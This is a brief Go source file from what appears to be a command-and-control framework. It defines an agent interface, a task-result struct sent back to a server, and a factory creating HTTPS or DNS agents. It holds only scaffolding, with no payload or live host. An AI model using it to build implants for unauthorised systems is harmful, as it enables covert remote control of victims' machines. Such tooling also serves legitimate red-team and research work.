package agent

import (
	"context"
	"encoding/json"
	"fmt"

	"c2framework/internals/config"
)

// Agent defines the contract for agents
type Agent interface {
	// Send sends a message and waits for a response
	Send(ctx context.Context) (json.RawMessage, error)
}

// AgentTaskResult represents the result of command execution sent back to server
type AgentTaskResult struct {
	JobID         string          `json:"job_id"`
	Success       bool            `json:"success"`
	CommandResult json.RawMessage `json:"command_result,omitempty"`
	Error         string          `json:"error,omitempty"`
}

// NewAgent creates a new agent based on the protocol
func NewAgent(cfg *config.AgentConfig) (Agent, error) {
	switch cfg.Protocol {
	case "https":
		return NewHTTPSAgent(cfg.ServerIP, cfg.ServerPort), nil
	case "dns":
		return NewDNSAgent(cfg.ServerIP, cfg.ServerPort), nil
	default:
		return nil, fmt.Errorf("unsupported protocol: %v", cfg.Protocol)
	}
}
